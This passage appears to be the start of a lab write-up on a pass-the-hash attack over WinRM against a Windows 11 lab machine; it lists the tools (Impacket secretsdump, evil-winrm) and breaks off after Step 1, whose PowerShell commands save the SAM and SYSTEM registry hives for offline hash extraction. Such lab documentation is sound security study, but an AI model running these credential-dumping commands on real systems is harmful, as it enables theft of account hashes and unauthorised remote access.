# Detailed Write-up: Pass-the-Hash via WinRM (Windows 11 Lab)

## Goal
Demonstrate credential access and remote command execution using NTLM hashes only (no password cracking).

## Environment (Sanitized)
- Target: Windows 11 (local lab)
- Attacker: WSL/Linux terminal
- Tools:
  - Windows: `reg.exe`, PowerShell
  - Linux: Impacket `secretsdump`, `evil-winrm`
- Notes:
  - IPs/usernames/hashes are redacted using placeholders.

---

## Step 1: Export registry hives (Windows Admin PowerShell)
The SAM and SYSTEM hives were exported to disk. This enables offline hash extraction.

**Windows (Admin PowerShell):**
```powershell
mkdir C:\Temp
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
